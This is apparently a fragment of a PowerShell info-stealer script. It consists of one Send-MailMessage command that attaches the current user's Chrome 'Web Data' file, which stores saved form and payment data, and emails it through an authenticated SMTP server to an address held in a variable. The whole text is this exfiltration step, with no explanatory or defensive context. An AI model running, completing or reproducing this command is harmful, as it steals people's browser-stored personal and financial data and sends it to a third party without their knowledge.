...
Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body "$Body" -Attachments "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\WebData" -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  
